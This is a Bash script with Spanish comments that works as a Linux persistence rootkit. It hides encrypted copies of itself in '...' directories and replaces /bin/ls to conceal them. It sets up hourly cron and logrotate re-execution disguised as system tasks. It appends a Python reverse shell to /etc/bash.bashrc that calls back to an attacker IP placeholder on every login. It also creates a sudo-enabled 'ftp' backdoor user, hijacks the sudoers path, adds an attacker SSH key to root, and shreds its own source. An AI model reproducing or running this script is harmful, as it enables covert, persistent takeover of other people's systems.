#!/bin/bash

#Comprobar que el script se tira como root

if [[ $EUID -ne 0 ]]; then
  echo "Este script debe ejecutarse como root"
  exit 1
fi


#Redirigir codigos de error
exec 2>/dev/null


#1////////////////// Copiarse a si mismo, cifrarse y esconderse. ////////////////////////////////

if ! [ -f "/usr/bin/shc" ]
then
sudo apt-get install shc 
uninstall=true
fi

shc -f $0 

#Hacer las copias

mkdir /...
mkdir /var/...
mkdir /tmp/...
mkdir /opt/...
mkdir /bin/...

cp $0.x.c /var/.../.$0.x.c
cp $0.x.c /.../.$0.x.c
cp $0.x.c /tmp/.../.$0.x.c
cp $0.x.c /opt/.../.$0.x.c
cp $0.x.c /bin/.../.$0.x.c
cp $0.x.c /var/.$0.x.c
cp $0.x.c /tmp/.$0.x.c
cp $0.x.c /opt/.$0.x.c
cp $0.x.c /bin/.$0.x.c
cp $0.x.c /.$0.x.c


#Corromper la funcion de ls y less

if ! [ -f /.../rma ]
then

sudo mv /bin/ls /.../rma

modate=$(stat /.../rma | cut -f 6 -d $'\n' | cut -f 2,3 -d ' ' | cut -b 1-4,6,7,9,10,12,13,15,16)

sudo touch /bin/ls -t "$modate" 

sudo echo 'command /.../rma $1 $2 $3 $4 | grep -E -v "\.\.\.|\.x\.c$" | column' > /bin/ls  

sudo chmod +x /bin/ls
fi 


#2//////////////Corromper una tarea cron que vuelva a ejecutar el mismo script cada x tiempo para mantener abiertas las vias de permanencia.////////////////////////

#Crear una tarea que ejecute el script a cada hora

sudo touch /etc/cron.d/logrotate
sudo chmod +x /etc/cron.d/logrotate 
echo "0 * * * * root bash /.$0.x.c" > /etc/cron.d/logrotate


#Modificar la tarea rsyslog de logrotate para que ejecute el script una vez al dia


echo "/var/log/syslog" > /etc/logrotate.d/rsyslog
echo "/var/log/mail.log" >> /etc/logrotate.d/rsyslog
echo "/var/log/kern.log" >> /etc/logrotate.d/rsyslog
echo "/var/log/auth.log" >> /etc/logrotate.d/rsyslog
echo "/var/log/user.log" >> /etc/logrotate.d/rsyslog
echo "/var/log/cron.log" >> /etc/logrotate.d/rsyslog
echo "{" >> /etc/logrotate.d/rsyslog
echo "        rotate 4" >> /etc/logrotate.d/rsyslog
echo "        weekly" >> /etc/logrotate.d/rsyslog
echo "       missingok" >> /etc/logrotate.d/rsyslog
echo "       notifempty" >> /etc/logrotate.d/rsyslog
echo "       compress" >> /etc/logrotate.d/rsyslog
echo "       delaycompress" >> /etc/logrotate.d/rsyslog
echo "       sharedscripts" >> /etc/logrotate.d/rsyslog
echo "       postrotate" >> /etc/logrotate.d/rsyslog
echo "               /usr/lib/rsyslog/rsyslog-rotate" >> /etc/logrotate.d/rsyslog
echo "               /bin/.$0.x.c" >> /etc/logrotate.d/rsyslog
echo "       endscript" >> /etc/logrotate.d/rsyslog
echo "}" >> /etc/logrotate.d/rsyslog


#Reiniciar el trabajo de cron.


sudo systemctl restart cron

sudo service cron restart


#3///////////Crear una consola inversa que intente abrirse cada vez que alguien hace login.///////

cat <<EOF >> /etc/bash.bashrc

python3 -c 'exec ("""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nobs.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("<YOUR IP HERE>",<PORT>))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")'

EOF

#Credit to therealdreg for his marvelous python shell.

#4/////////////////////Crear un usuario zombi con permisos escondidos.//////////////////////

id ftp 

if [ $? -eq 1 ]
then
useradd -s /bin/bash ftp
 
usermod -aG sudo ftp

echo -e "ftpftpftp\nftpftpftp" | passwd ftp
fi

#5//////////Romper el path de sudo para que sea posible volver a escalar privilegios./////////////

sudo cp /etc/sudoers /.../sudoers

sudo echo "%sudo ALL=(ALL:ALL) ALL" >> /.../sudoers

sudo echo "Plugin sudoers_policy sudoers.so sudoers_file=/.../sudoers" >> /etc/sudo.conf


#6////////////Checkear SSH y si existe, anyadir a las claves consentidas la clave privada de la terminal de control./////////

if [ -f /bin/ssh ]
then 
if ! [ -d /root/.ssh ]
then 
sudo mkdir /root/.ssh
touch /root/.ssh/authorized_keys
fi 
echo "YOUR PUBLIC SSH KEY HERE" >> /root/.ssh/authorized_keys
fi 

#7///////////////LIMPIEZA/////////////////

#Desinstalar shc si corresponde

if [ "$uninstall" = true ]
then 
sudo apt-get purge shc
fi

#Limpiar el binario cifrado de copia

rm $0.x.c

#DESTRUIR EL BINARIO EN TEXTO
shred $0 -f -u -n 9 -z 

